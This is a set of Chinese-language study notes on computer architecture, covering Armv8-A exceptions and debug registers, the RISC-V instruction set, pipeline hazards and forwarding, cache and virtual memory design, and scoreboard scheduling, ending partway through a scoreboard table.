<p>注意<code>SPSR_ELx</code>中指定的Execution State必须匹配<code>SCR_EL3.RW</code>或<code>HCR_EL2.RW</code>中的任意一个，否则将会产生一个illegal exception return。</p>
<p>在<code>ERET</code>指令的执行过程中，state会从<code>SPSR_ELx</code>恢复，而PC将会被更新为<code>ELR_ELx</code>中存储的值。这两个更新是原子进行的，防止PE处于一个未定义的状态。</p>
<h3 id="exception-stacks"><a class="header" href="#exception-stacks">Exception Stacks</a></h3>
<p>在AArch64中，架构有两个栈寄存器可用<code>SP_EL0</code>和<code>SP_ELx</code>，x是当前的Exception Level。比如EL1允许使用<code>SP_EL0</code>或者<code>SP_EL1</code>。</p>
<p>在一般情况下，所有的代码都使用<code>SP_EL0</code>。当处理异常的时候，<code>SP_ELx</code>被选择，这允许我们为异常的处理维护一个单独的栈。这对于在处理堆栈溢出引起的异常时维护有效堆栈很有用。</p>
<h2 id="6-the-vector-tables"><a class="header" href="#6-the-vector-tables">6 The vector tables</a></h2>
<p>vector table是一个普通的内存区域，里面是若干指令。PE在System Register中保存Table的基地址，每一个异常种类都有从该基地址定义的偏移量。</p>
<p>每个Exception Level都有自己的vector table，由<strong>Vector Base Address Register</strong><code>VBAR_ELx</code>寄存器定义，其中<code> &lt;x&gt;</code> 是 1、2 或 3。</p>
<p><code>VBAR</code> 寄存器的值在复位后未定义，因此必须在启用中断之前对其进行配置。</p>
<p>向量表的格式如下</p>
<p><img src="Basic/Architecture/../images/6274ea357e121f01fd22f194.png" alt="向量表" /></p>
<h2 id="7-check-your-knowledge"><a class="header" href="#7-check-your-knowledge">7 Check your knowledge</a></h2>
<p>The following questions will help you test you knowledge:</p>
<ul>
<li>
<p>What Exception levels are implemented in Armv8-A?</p>
<p>EL0 and EL1 are mandatory. EL2 and EL3 are optional but implemented by most designs.</p>
</li>
<li>
<p>What are the Execution states?</p>
<p>AArch32 and AArch64</p>
</li>
<li>
<p>Which stack is used on exception entry?</p>
<p><code>SP_ELx</code> is automatically selected to provide a safe exception stack.</p>
</li>
<li>
<p>How are the vector tables implemented in AArch64</p>
<p>The PE holds the base address of the table in <code>VBAR_ELx</code>. The table itself is instruction memory.</p>
</li>
</ul>
<p><code>SP_ELx</code>: 栈寄存器</p>
<p><code>VBAR_ELx</code>: 异常向量表基地址寄存器</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="armv8-a-virtualization"><a class="header" href="#armv8-a-virtualization">Armv8-A virtualization</a></h1>
<p>原文链接 https://developer.arm.com/documentation/102142/0100</p>
<h2 id="1-overview-1"><a class="header" href="#1-overview-1">1 Overview</a></h2>
<p>需要了解 <a href="https://developer.arm.com/architectures/learn-the-architecture/exception-model">Exception model</a> 和  <a href="https://developer.arm.com/architectures/learn-the-architecture/memory-management">Memory management</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="arm-self-hosted-debug"><a class="header" href="#arm-self-hosted-debug">ARM self-hosted debug</a></h1>
<h2 id="4-armv8-a-debug"><a class="header" href="#4-armv8-a-debug">4 Armv8-A debug</a></h2>
<h3 id="44-operating-system-debugging"><a class="header" href="#44-operating-system-debugging">4.4 Operating system debugging</a></h3>
<p>Operating system debugging允许运行在EL2的调试器程序，调试运行在EL0和EL1的代码。EL0和EL1产生的调试异常在EL2处理。Operating system debugging允许Hypervisor调试操作系统。</p>
<p>一些重要的管理调试的寄存器：</p>
<ul>
<li><code>MDSCR_EL1</code>, Monitor debug System Control Register</li>
<li><code>MDCR_EL2</code>, Monitor debug Configuration Register (EL2)</li>
</ul>
<h2 id="6-debug-exceptions"><a class="header" href="#6-debug-exceptions">6 Debug Exceptions</a></h2>
<p><strong>调试器</strong>程序作为异常处理程序代码安装，处理<strong>调试异常</strong>并且修改调试寄存器。调试器处理的调试异常是同步异常，它们被路由到调试器的异常级别。</p>
<p>调试器程序所处的异常级别称作debug target Exception level(<strong>ELd</strong>)，调试器程序的代码可以看作是运行在ELd的异常处理代码。<strong>ELd可能是EL1或者EL2</strong>，如果EL3使用AArch32的话也可以将调试异常路由到EL3。</p>
<p>当在ELd上处理调试异常时，调试器程序有下面几种办法获得异常原因</p>
<ul>
<li><code>ESR_ELx</code>编码的异常的种类。</li>
<li>对于Watchpoint exception，<code>FAR_ELx</code>表示检测的地址。</li>
</ul>
<p>Self-hosted调试支持下面的调试异常：</p>
<ul>
<li>Breakpoint instruction(软件断点)：当PE执行<code>BRK</code>指令时产生。</li>
<li>Breakpoint(硬件断点)：当PE执行特定地址的指令时产生。</li>
<li>Watchpoint(内存断点)：当PE访问特定地址时产生。</li>
<li>Software step(单步执行)：当PE执行一条指令后产生。</li>
</ul>
<h3 id="61-breakpoint-instruction-exception"><a class="header" href="#61-breakpoint-instruction-exception">6.1 Breakpoint Instruction Exception</a></h3>
<h3 id="62-breakpoint-exception"><a class="header" href="#62-breakpoint-exception">6.2. Breakpoint exception</a></h3>
<p>当PE访问特定地址时产生Breakpoint exception。断点对应的代码地址，存储在hardware breakpoint registers中。当PE将要执行hardware breakpoint registers存储的地址的代码时，产生Breakpoint Exception。</p>
<p>所以，要创建硬件断点，需要下面两步：</p>
<ol>
<li>将断点地址存储在<code>DBGBVR</code>寄存器中。Debug Breakpoint Value Registers</li>
<li>使能<strong>断点控制寄存器</strong><code>DBGBCR</code>的<code>DBGBCR.E</code>。Debug Breakpoint Control Registers</li>
</ol>
<p><code>DBGBVR</code>和<code>DGBBCR</code>有很多种设置的方式。其中一种，是让<code>DBGBVR</code>为要断的虚拟地址，<code>DBGBCR.E = 1, DBGBCR.BT = 0</code>。</p>
<ul>
<li><code>DBGWCR0_EL1</code> and <code>DBGWVR0_EL1 </code>are for watchpoint 0</li>
<li><code>DBGWCR1_EL1</code> and <code>DBGWVR1_EL1</code> are for watchpoint 1</li>
<li><code>DBGWCR2_EL2</code> and <code>DBGWVR2_EL1</code> are for watchpoint 2</li>
<li><code>DBGWCR&lt;n&gt;_EL1</code> and <code>DBGWVR&lt;n&gt;_EL1</code>are for watchpoint n.</li>
</ul>
<h2 id="7-enabling-and-routing-for-debug-exception"><a class="header" href="#7-enabling-and-routing-for-debug-exception">7 Enabling and routing for debug exception</a></h2>
<h3 id="71-enabling-debug-exceptions-for-self-hosted-debugging"><a class="header" href="#71-enabling-debug-exceptions-for-self-hosted-debugging">7.1. Enabling debug exceptions for self-hosted debugging</a></h3>
<p>软件断点异常总是被允许的，而且不能be masked。对于其他的调试异常，我们可以选择开启或禁用他们。下面是开启调试异常的步骤：</p>
<ol>
<li>清除OS Lock。在AArch64上，是将<code>OSLAR_EL1.OSLK(0)</code>清空。</li>
<li>清除OS double lock，如果有实现的话。在AArch64上，是将<code>OSDLR_EL1.DLK(0)</code>清空。</li>
<li>如果调试Secure code需要清除<code>MDCR_EL3.SDD</code></li>
<li>如果 要调试的代码 和 调试器的代码 ，运行在同一个Exception Level，将<code>MDSCR_EL1.KDE</code>设置成1。</li>
<li>如果<code>KDE</code>被设置了，那么需要确保 要调试的代码 的<code>PSTATE.D</code>被清0。可以通过<code>MSRDAIFclr, #8</code>指令，或者通过设置<code>SPSR_ELd.D</code>为0然后执行<code>ERET</code>，返回到要调试的代码的Exception Level来完成清0。</li>
<li>设置<code>MDSCR_EL1.MDE/DBGDSCRint.MDBGen</code>为1。他允许除了单步调试之外的调试异常。</li>
<li>设置<code>MDSCR_EL1.SS</code>为1。将允许单步调试。
<ol>
<li>如果<code>SS</code>被设置了，请保证<code>PSATE.D</code>被设置成1了。</li>
</ol>
</li>
<li>在手册中没有提到，但是PMC应该设置为1。</li>
</ol>
<h3 id="72-routing-for-debug-exceptions"><a class="header" href="#72-routing-for-debug-exceptions">7.2 Routing for debug exceptions</a></h3>
<p>在ARMv8-A的异常模型中，EL0产生的异常是不能在EL0处理的，这些异常需要被路由到更高的Exception Level。EL0产生的调试异常总是被路由到EL1或EL2，这意味着调试器总是应该安装在EL1或者EL2。</p>
<p>如果调试器安装在EL1，将<code>MDCR_EL2.TDE</code>设置为0，在这种情况下，所有的调试异常都会被路由到EL1；如果调试器安装在EL1，将<code>MDCR_EL2.TDE</code>设置为1，在这种情况下，所有的调试异常都会被路由到EL2。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第一章衡量cpu的效率"><a class="header" href="#第一章衡量cpu的效率">第一章——衡量CPU的效率</a></h1>
<p>CPU的8个设计原则：</p>
<ol>
<li>Design for Moore's Law</li>
<li>Use Abstraction to Simplify Desgin</li>
<li>Make the Common Case Fast</li>
<li>Performance via Parallelism</li>
<li>Performance via Pipelining</li>
<li>Performance via Prediction</li>
<li>Hierarchy of Memories</li>
<li>Dependability via Redundancy</li>
</ol>
<p>衡量CPU的效率：</p>
<p>CPU时间 = 指令数量×IPC = IC×CPI×时钟周期长度 = IC×CPI/时钟频率</p>
<p>CPI，指令平均时钟周期数clock cycle per instruction</p>
<p>IC，指令数量，Instruction count</p>
<h1 id="第二章riscv指令"><a class="header" href="#第二章riscv指令">第二章——RISCV指令</a></h1>
<p>基础的RV64I一共有6种类型的指令：</p>
<img src="Basic/Architecture/../post-images/opcode_format.jpg" alt="opcode_format" style="zoom:80%;" />
<img src="Basic/Architecture/../post-images/opcode.jpg" alt="opcode" style="zoom:150%;" />
<p>学会汇编看这些东西都没什么问题。不过需要注意的是，RISCV的寻址方式。</p>
<ol>
<li>
<p>PC相对寻址。无论是beq，还是jal，都是以PC当前的地址作为基址来进行相对偏移寻址。这个和X86是不同的。至于原理，看下面CPU的设计图就一目了然了。另外，RISCV的指令要求是2字节对齐的，所以你看到那些跳转指令的立即数都是从1开始的。</p>
</li>
<li>
<p>基址寻址，操作数在内存中，地址是寄存器和指令中的常量之和。<code>jalr rd, offset(rs1)</code>，是把<code>pc=rs1+offset</code>。<code>ld rs,offset(rd)</code></p>
</li>
<li>
<p>寄存器寻址，操作数全部都在寄存器中。比如<code>add rd,rs1,rs2</code>，</p>
</li>
<li>
<p>立即数寻址，操作数是指令本身的常量。比如<code>addi rd,rs,imm</code>。<code>sd rs,offset(rd)</code>应该是吧？</p>
<img src="Basic/Architecture/../post-images/image-20210428091126744.png" alt="image-20210428091126744" style="zoom:67%;" />
</li>
</ol>
<p>还有两条加锁指令：</p>
<p><code>lr.d rd, (rs1) x[rd] = LoadReserved64(M[x[rs1]])</code>加载保留双字(Load-Reserved Doubleword). R-type, RV64A.
从内存中地址为 x[rs1]中加载八个字节，写入 x[rd]，并对这个内存双字注册保留。</p>
<p><code>sc.d rd, rs2, (rs1) x[rd] = StoreConditonal64(M[x[rs1], x[rs2])</code>条件存入双字(Store-Conditional Doubleword). R-type, RV64A only
如果内存地址 x[rs1]上存在加载保留，将 x[rs2]寄存器中的 8 字节数存入该地址。如果存入成功，向寄存器 x[rd]中存入 0，否则存入一个非 0 的错误码。</p>
<p>据说从C翻译汇编/汇编翻译成C是必考题啊。这些指令容易被我忽视：</p>
<div class="table-wrapper"><table><thead><tr><th>指令</th><th>含义</th></tr></thead><tbody>
<tr><td>sltu rd, rs1, rs2</td><td>x[rd] = (x[rs1] &lt;𝑢 x[rs2])</td></tr>
<tr><td>sltiu rd, rs1, immediate</td><td>x[rd] = (x[rs1] &lt;𝑢 sext(immediate))</td></tr>
<tr><td>srai rd, rs1, shamt</td><td>x[rd] = (x[rs1] ≫𝑠 shamt)，算数</td></tr>
<tr><td>srl rd, rs1, rs2</td><td>x[rd] = (x[rs1] ≫𝑢 x[rs2])，逻辑</td></tr>
<tr><td>slli rd, rs1, shamt</td><td>x[rd] = x[rs1] ≪ shamt</td></tr>
</tbody></table>
</div>
<h1 id="第三章算数运算"><a class="header" href="#第三章算数运算">第三章——算数运算</a></h1>
<p>这一章节我在书上做了很多笔记，就不搬运了。</p>
<h2 id="加减法"><a class="header" href="#加减法">加减法</a></h2>
<p>这个没啥好说的，数字逻辑就学过了。</p>
<p>溢出的判断条件 <code>次高位进位 xor 最高位进位 = 1</code>，说明有符号数溢出。</p>
<h2 id="乘法"><a class="header" href="#乘法">乘法</a></h2>
<p><img src="Basic/Architecture/../post-images/image-20210428092218374.png" alt="image-20210428092218374" /></p>
<h2 id="除法"><a class="header" href="#除法">除法</a></h2>
<p><img src="Basic/Architecture/../post-images/image-20210428092302149.png" alt="image-20210428092302149" /></p>
<h2 id="浮点加法"><a class="header" href="#浮点加法">浮点加法</a></h2>
<h3 id="ieee的浮点数"><a class="header" href="#ieee的浮点数">IEEE的浮点数</a></h3>
<p>32位：1bit+8bit+23bit。64位：1bit+11bit+52bit。</p>
<p>尾数是省略了默认的前导1的。指数要减去127/1023。不过这都是针对 normalized number，还有 denormalized number。</p>
<p><img src="Basic/Architecture/../post-images/image-20210430181618172.png" alt="image-20210430181618172" /></p>
<p>浮点数加法：首先要把浮点数的Exponent统一成其中较大的那个，然后把他们的Fraction相加，对和进行normalize的同时改变Exponent。</p>
<p><img src="Basic/Architecture/../post-images/image-20210428092442706.png" alt="image-20210428092442706" /></p>
<p>最后要知道提高精度的一些办法。</p>
<h1 id="第四章cpu设计"><a class="header" href="#第四章cpu设计">第四章——CPU设计</a></h1>
<p>书上的设计满足的指令有：</p>
<ul>
<li>R-type：add sub ...</li>
<li>I-type：addi, subi, ... ld</li>
<li>S-type：sd</li>
<li>B-type：beq</li>
</ul>
<p>我们的实验加上了Jal</p>
<h2 id="单周期cpu"><a class="header" href="#单周期cpu">单周期CPU</a></h2>
<p><img src="Basic/Architecture/../post-images/2021-04-24_20-27.png" alt="2021-04-24_20-27" /></p>
<p>R-Type指令的数据通路。包括add,sub,and,or,xor,not,slt,shr<img src="Basic/Architecture/../post-images/R-type.png" alt="R-type" /></p>
<p>LD：</p>
<p><img src="Basic/Architecture/../post-images/LD-type.png" alt="LD-type" /></p>
<p>I-Type：addi, subi, ori,</p>
<p><img src="Basic/Architecture/../post-images/I-type.png" alt="I-type" /></p>
<p>S-type：sd</p>
<p><img src="Basic/Architecture/../post-images/S-type.png" alt="S-type" /></p>
<p>B-type：beq</p>
<p><img src="Basic/Architecture/../post-images/B-type.png" alt="B-type" /></p>
<h2 id="流水线cpu"><a class="header" href="#流水线cpu">流水线CPU</a></h2>
<p>经典的五阶段流水线CPU：</p>
<ol>
<li>IF: Instruction fetch</li>
<li>ID: Instruction decode and register file read</li>
<li>EX: Execution or address calculation</li>
<li>MEM: Data memory access</li>
<li>WB: Write back</li>
</ol>
<center>
    IF - ID - EX - MEM - WB
</center>
<p><img src="Basic/Architecture/../post-images/pipeline_example.png" alt="pipeline_example" /></p>
<p>这是没有考虑冒险的Pipeline CPU设计图。</p>
<p>我们要保存很多信息以备之后使用。比如要保存rd作为写回阶段的目标寄存器，比如ld。</p>
<p>Control信号中，在ID阶段除了ALU Control都可以确定了。所以ID阶段把control信号传递给后面的阶段，这样就不用把整条指令往后面传递了。</p>
<p><img src="Basic/Architecture/../post-images/%E4%B8%8D%E8%80%83%E8%99%91%E5%86%92%E9%99%A9%E7%9A%84%E6%B5%81%E6%B0%B4%E7%BA%BF.png" alt="image-20210425121135376" /></p>
<p>可以来看一下Sd的数据通路，</p>
<p><img src="Basic/Architecture/../post-images/%E6%B5%81%E6%B0%B4%E7%BA%BFS.png" alt="流水线S" /></p>
<ul>
<li>我们要传递到WB的信号（MEM/WB保存的信号）：RegWrite决定要不要写回，MemtoReg决定是从Mem还是ALU中写回。</li>
<li>我们要传递到MEM的信号（EX/MEM保存的信号）：要保存上述的两个信号。Branch、MemRead、MemWrite需要。</li>
</ul>
<h3 id="冒险"><a class="header" href="#冒险">冒险</a></h3>
<h4 id="数据冒险star"><a class="header" href="#数据冒险star">数据冒险:star:</a></h4>
<p>红色：第一种数据竞争。但其实在第一条指令的EX后数据就已经产生，在第二条指令的EX数据才真正被使用。所以可以将数据forward。也就是说，在ALU的Src1和Src2之前要加上MUX来选择。</p>
<p>粉色：第二种数据竞争。同样的在第一条指令的EX后数据就已经产生，在第三条指令的EX数据才真正被使用。也可以将数据forward</p>
<p><img src="Basic/Architecture/../post-images/image-20210425222220300.png" alt="image-20210425222220300" /></p>
<p>红色冲突<strong>EX冒险</strong>的解决方案：</p>
<pre><code>if (EX/MEM.RegWrite								//一定是之后要写回才要forward
and EX/MEM.RegWrite != 0 						//x0不需要forward，否则反而是错的
and EX/MEM.RegisterRd == ID/EX.RegisterR1) 		//发生了冲突
ForwardA = 10;

if (EX/MEM.RegWrite
and EX/MEM.RegWrite != 0 
and EX/MEM.RegisterRd == ID/EX.RegisterR2) 
ForwardB = 10;
</code></pre>
<p>粉色冲突的<strong>MEM冒险</strong>解决方案：</p>
<pre><code>if (EX/MEM.RegWrite								//一定是之后要写回才要forward
and EX/MEM.RegWrite != 0 						//x0不需要forward，否则反而是错的
and not (EX/MEM.RegWrite and EX/MEM.RegWrite != 0 and EX/MEM.RegisterRd == ID/EX.RegisterR1)	//如果是红色冲突发生，红色优先。
												//在上图中，就是第二条指令和第三条指令之间出现了冒险	
and EX/MEM.RegisterRd == ID/EX.RegisterR1) 		//发生了冲突
ForwardA = 01;

if (EX/MEM.RegWrite
and EX/MEM.RegWrite != 0 
and not (EX/MEM.RegWrite and EX/MEM.RegWrite != 0 and EX/MEM.RegisterRd == ID/EX.RegisterR2)
and EX/MEM.RegisterRd == ID/EX.RegisterR2) 
ForwardB = 01;
</code></pre>
<p>数据冒险的另一种情况：ld指令。</p>
<p><img src="Basic/Architecture/../post-images/image-20210427184354070.png" alt="image-20210427184354070" /></p>
<p>红色冒险可以用forward的办法和之前一样解决，但是我们显然无法把绿色冒险forward。因为ld指令的数据在MEM/WB阶段才真正产生。所以对于绿色冒险，我们必须用stall的办法：</p>
<pre><code>if (ID/EX.MemRead and 							//我发现我要Load内容了，趁早发现，否则就2条指令开始执行了
	ID/EX.RegisterRd = IF/ID.RegisterRs)		//要load的目标和要用的寄存器冲突了，Rs1/Rs2
	stall the pipeline							
</code></pre>
<p>如果我们多stall几个就可以完全避免问题，但事实上我们就stall一个周期，之后再用forward来解决问题。</p>
<pre><code>if (MEM/WB.RegisterRd == ID/EX.RegisterRs 
	MEM/WB.RegisterRd != 0)
	forward
</code></pre>
<h4 id="控制冒险"><a class="header" href="#控制冒险">控制冒险</a></h4>
<p>如图所示，我们到EX/MEM阶段才知道我们是不是需要跳转，这个时候好2/3条指令都执行完了，不过不会造成不好的影响（没有写内存和寄存器），可以直接丢弃信号。</p>
<p><img src="Basic/Architecture/../post-images/image-20210427193907426.png" alt="image-20210427193907426" /></p>
<p>有这些解决方案：</p>
<ol>
<li>假设分支不发生。这样分支不发生的时候没有代价；如果分支发生，我们需要丢弃三条指令的结果。因为他们还没有到达MEM和WB，所以直接把他们的信号清空即可。还可以更早的时候EX/MEM知道，这样只需要丢弃两条指令。</li>
<li>事实上我们还可以更早的时候知道，在ID/EX的时候就可以知道，这样就只需要丢弃一条指令。但是这个就十分复杂了。
<ol>
<li>这意味着之前的forward要考虑更多，因为可能都要forward到ID阶段用了。</li>
<li>在ID阶段添加检测是否需要跳转的XOR</li>
</ol>
</li>
<li>动态分支预测。用更高级的策略预测是否分支。</li>
<li>停顿到出结果为止23333。</li>
</ol>
<p>在ID/EX阶段知道：</p>
<p>是出于<code>beq</code>设计的，所以添加了<code>=</code>逻辑。需要注意的是，在之前的数据竞争中，都是假设EX阶段是真正需要寄存器值的地方，但是现在我们还要添加额外的逻辑判断这里有没有产生数据竞争。</p>
<p><img src="Basic/Architecture/../post-images/image-20210703204625972.png" alt="image-20210703204625972" /></p>
<h4 id="结构冒险"><a class="header" href="#结构冒险">结构冒险</a></h4>
<p>硬件不支持多条指令在同一个时钟周期执行。我们在设计流水线CPU时就应该避免出现结构冒险。</p>
<h3 id="总结"><a class="header" href="#总结">总结</a></h3>
<p>这是最终的流水线CPU设计图</p>
<p><img src="Basic/Architecture/../post-images/image-20210427200349469.png" alt="image-20210427200349469" /></p>
<p>举一个ld的例子，来说明如何工作。我觉得上面那个图不太对，虽然下面这个图也是一个半成品。</p>
<p><img src="Basic/Architecture/../post-images/ld-pipeline.png" alt="ld-pipeline" /></p>
<h3 id="超越"><a class="header" href="#超越">超越</a></h3>
<p>这个是完备的<a href="http://x.dii.unisi.it:8098/~giorgi/WebRISC-V/index.php">五级流水线图</a>：</p>
<p><img src="Basic/Architecture/../post-images/image-20210703211928460.png" alt="image-20210703211928460" /></p>
<h2 id="trap"><a class="header" href="#trap">Trap</a></h2>
<p>Trap包括Exception和Interrupt。是更高级的控制冒险了。</p>
<p>一个是确定地址+scause的异常处理，一个是根据不同类型跳转到不同地址的异常处理。</p>
<h2 id="multiple-issue"><a class="header" href="#multiple-issue">Multiple Issue</a></h2>
<p>如果出现了冒险，就不好双发了。</p>
<p>静态多发：由编译器来打包<strong>发射指令包</strong>（一个周期同时执行的指令们），书上举了例子是lw/sw和算数指令的一起发射，编译器要负责不能让他们冲突。</p>
<p>动态多发处理器，也叫做<strong>超标量superscalar</strong>处理器。</p>
<p>经典的动态多发示意图：Reservation station存放指令的操作和所需的操作数，只要他们准备好，并且Funcitional units准备就绪，就可以执行指令。指令执行结束，结果被传送给Reservation station中正在等待使用该结果的指令，同时也传送到Commit unit中进行保存。Commit Unit中保存了已完成指令的执行结果，并在指令真正提交的时候才使用他们更新寄存器或写入内存。</p>
<p>位于Commit unit的buffer，通常叫做reorder buffer，也可以为其他指令提供操作数。一旦指令提交，寄存器就得到更新，就可以像正常流水线一样直接从寄存器中获取最新的数据。</p>
<img src="Basic/Architecture/../post-images/image-20210426102047948.png" alt="image-20210426102047948" style="zoom:50%;" /><div style="break-before: page; page-break-before: always;"></div><hr />
<h2 id="time-2022325"><a class="header" href="#time-2022325">Time: 2022/3/25</a></h2>
<h1 id="cache"><a class="header" href="#cache">Cache</a></h1>
<p>Cache之所以可以加快速度，是利用了程序的时间局部性和空间局部性。</p>
<p>$$
AMAT = HitTime + MissRate \times MissPenalty
$$</p>
<h2 id="improvement"><a class="header" href="#improvement">Improvement</a></h2>
<p>提高Cache的工作效率，有下面这些办法：</p>
<ul>
<li>减小Miss Panalty: multilevel caches, critical word first, read miss before write miss, merging write buffers, and victim caches</li>
<li>减小Miss Rate: larger block size, large cache size, higher associativity, way prediction and pseudo-associativity, and compiler optimizations</li>
<li>parallelism: non-blocking caches, hardware prefetching, and compiler prefetching</li>
<li>减小命中时的时间: small and simple caches, avoiding address translation, pipelined cache access, and trace caches</li>
</ul>
<h2 id="cache-design"><a class="header" href="#cache-design">Cache Design</a></h2>
<p>在Cache Design中，有4个问题要考虑</p>
<h3 id="where-can-a-block-be-placed-in-main-memory"><a class="header" href="#where-can-a-block-be-placed-in-main-memory">Where can a block be placed in main memory?</a></h3>
<ul>
<li>Full Associative:主存中任何一块都可以映射到Cache中的任何一块位置上。</li>
<li>Direct Mapped: 主存中的一个块只能映射到Cache的某一特定块中去。</li>
<li>Set Associative: 主存中的一个块只能映射到Cache的<strong>某一组特定块</strong>中去。可以把之前两种看成特殊的Set Associative。</li>
</ul>
<p>从地址的解析说起，对于一个地址，我们通常可以将他划分为</p>
<pre><code>tag + set index + block offset
</code></pre>
<ol>
<li>我们根据index去寻址地址对于的块的组。对于Full Associative，没有index，整个cache就是一个组；对于Direct Mapped: 组的大小是1。</li>
<li>将tag和组内所有的valid block的tag进行对比，如果有匹配的就是hit，否则就是Miss。</li>
</ol>
<h3 id="how-is-a-block-found-if-it-is-in-main-memory"><a class="header" href="#how-is-a-block-found-if-it-is-in-main-memory">How is a block found if it is in main memory?</a></h3>
<p>从Cache的存储内容说起，一个Cache中<strong>至少</strong>包含以下信息</p>
<pre><code>valid + tag + data
</code></pre>
<p>如果valid = 1，并且tag和address中的tag部分匹配上了，那就找到了对应的块。在用address中的offset去找到data中对应的字。</p>
<h3 id="which-block-should-be-placed-on-a-miss-"><a class="header" href="#which-block-should-be-placed-on-a-miss-">Which block should be placed on a miss ?</a></h3>
<p>当我们没有采用Direct Mapped的时候，我们就要考虑一组Cache都被填满之后应该将哪一块替换出去的问题了。</p>
<ul>
<li>Random: 随机</li>
<li>LRU(less recent use): 将最久没有被使用的块替换。</li>
<li>FIFO(first in first out): 将最先缓存的块替换。</li>
</ul>
<p>Stack-based algorithm: 我们记$B_t(n)$ the set of access sequences contained in a cache block of size $n$ at time $t$. 如果我们使用的替换策略是stack-based algorithm，那么$B_t(n) \subseteq B_t(n+1)$，也就是说Cache的增大一定可以带来Miss的减小（或不变）。 LRU算法是stack-based algorithm，而FIFO不是。</p>
<p>怎么实现LRU呢？用Comparison Pair Method. Let each cache block be combined in pairs, use a comparison pair flip-flop to record the order in which the two cache blocks have been accessed in the comparison pair, and then use a gate circuit to combine the state of each comparison pair flip-flop, you can find the block to be replaced according to the LRU algorithm. 来看一个例子：</p>
<p>对于组内的3个块ABC，我们有$C^2_3$个对$T_{AB}, T_{AC}, T_{BC}$。T_AB = 1表示A is recently accessed than B，为0反之。那么我们就可以用组合电路计算出ABC哪个less recently access. 比如$LRU_C = T_{AC} \times T_{BC} $。</p>
<h3 id="what-happens-on-a-write"><a class="header" href="#what-happens-on-a-write">What happens on a write?</a></h3>
<ul>
<li>Write back: 更新cache时，只是把更新的cache block标记成dirty，并不同步更新memory。当cache block被替换时，才真正的写回memory。Writes occur at speed of cache and main memory bandwidth is smaller when multiple writes occur to the same block.</li>
<li>Write through: 更新cache时，同时更新memory对应的内容。Read misses don't result in writes, memory hierarchy is consistent and it is simple to implement</li>
</ul>
<p>那么如果出现了write miss又怎么办？也有两个策略：</p>
<ul>
<li>Write allocate: 将写入位置内容读入cache。通常和Write back一起使用，这样可以提高对一个地址反复写入的效率。</li>
<li>No write allocate: 直接将数据写入储存。通常和Write-though一起使用。</li>
</ul>
<p>如果每次写回内存都要等的话代价太大，可以增加write buffer，缓存要写回的内容。</p>
<h2 id="virtual-memory"><a class="header" href="#virtual-memory">Virtual Memory</a></h2>
<p>操作系统学习的页表机制就是Virtual Memory的一个很好的例子。可以认为memory是硬盘的cache。也考虑那四个问题：</p>
<ol>
<li>
<p>Where can a block be placed in main memory?</p>
<p>因为极高的miss penalty，所以采用了Fully associative strategy，即OS允许virtual page映射到任何physical frame。</p>
</li>
<li>
<p>How is a block found if it is in main memory?</p>
<p>采用页表机制，为了节省空间又有多级页表。</p>
</li>
<li>
<p>Which block should be replaced on a virtual memory miss?</p>
<p>通常使用LRU。</p>
</li>
<li>
<p>What happens on a write?</p>
<p>因为极高的write penalty（写回硬盘需要很多很多个时钟周期），我们采用write back策略。所以我们需要dirty bit。有时我们还需要手动的同步。</p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ilp"><a class="header" href="#ilp">ILP</a></h1>
<!-- toc -->
<h2 id="相关"><a class="header" href="#相关">相关</a></h2>
<p>共有 3 种不同类型的相关:数据相关(也称为真数据相关)、名称相关和控制相关。</p>
<ul>
<li>Data Dependences：指令i生成的结果被指令j用到，那么我们说指令j数据相关与指令i。这个相关可以<strong>传递</strong>。如果两条指令是数据相关的，那它们必须按顺序执行，不能同时执行或不能完全重叠执行。</li>
<li>Name Dependences：当两条指令使用相同的寄存器或存储器位置（称为名称），但与该名称相关的<strong>指令之间并没有数据流动</strong>时，就会发生名称相关。</li>
<li>Data Hazards：只要指令间存在名称相关或数据相关，而且它们非常接近，足以使执行期间的重叠改变对相关操作数的访问顺序，那就会存在冒险。有WAR(name dependence), RAW(data dependence), WAW冒险。</li>
<li>Control Dependences</li>
</ul>
<p>在RISC-V流水线中，写回只在最后进行，不会出现WAR和WAW的竞争。但是在乱序执行中会出现。比如下面的add和sub就会出现读后写。RAW是Data Dependence，WAR和WAW是Name Dependence，其中WAW又叫 Output-dependence，WAR又叫Anti-dependence。</p>
<pre><code>fdiv.d f0,f2,f4
fadd.d f10,f0,f8
fsub.d f8,f8,f14
</code></pre>
<h2 id="scoreboard"><a class="header" href="#scoreboard">Scoreboard</a></h2>
<img src="Basic/Architecture/../images/image-20211124141326051.png" alt="image-20211124141326051" style="zoom:50%;" />
<h3 id="执行流程"><a class="header" href="#执行流程">执行流程</a></h3>
<ol>
<li>Issue: If a functional unit for the instruction is free and <strong>no other active instruction has the same destination register with (和src和dst都不一样)</strong>, the scoreboard issues the instruction to the functional unit and updates its internal data structure.</li>
<li>Read operands: The scoreboard monitors the availability of the source operands. <strong>A source operand is available if no earlier issued active instruction is going to write it.</strong> When the source operands are available, the scoreboard tells the functional unit to proceed to read the operands from the registers and begin execution.</li>
<li>Execution—The functional unit begins execution upon receiving operands. When the result is ready, it notifies the scoreboard that it has completed execution.</li>
<li>Write result—Once the scoreboard is aware that the functional unit has completed execution, <strong>the scoreboard checks for WAR hazards and stalls the completing instruction, if necessary</strong>.</li>
</ol>
<h3 id="记录信息"><a class="header" href="#记录信息">记录信息</a></h3>
<p>以下面的程序为例</p>
<pre><code>FLD		F6, 34(R2)
FLD		F2, 45(R3)
FMUL.D	F0, F2, F4
FSUB.D	F8, F2, F6
FDIV.D	F10, F0, F6
FADD.D	F6, F8, F2 
</code></pre>
<p>要记录的信息一共有三张表：</p>
<ol>
<li>
<p>记录指令执行到哪个阶段了</p>
<p><img src="Basic/Architecture/../images/image-20211118183110374.png" alt="image-20211118183110374" /></p>
</li>
<li>
<p>记录执行结构的状态。我们介绍Scoreboard算法一般都是用这个例子，有2个乘法器、1个加法器、1个除法器和一个load/save运算器。</p>
<ul>
<li>Busy: issue之后，执行元件就应该是busy了，不能再让同类指令发射，否则就结构竞争了，一直到write完成之后Busy状态才结束。</li>
<li>Fi Fj Fk: 目的操作数，源操作数1，源操作数2</li>
<li>Qj Qk: 如果有，表示源操作数正在等待其他执行元件执行完，避免数据竞争。
<ul>
<li>Rj Rk == yes :operand is ready but not read</li>
<li>Rj Rk == no &amp; Q == null :operand is read</li>
<li>Rj Rk == no &amp; Q != null :operand is not ready</li>
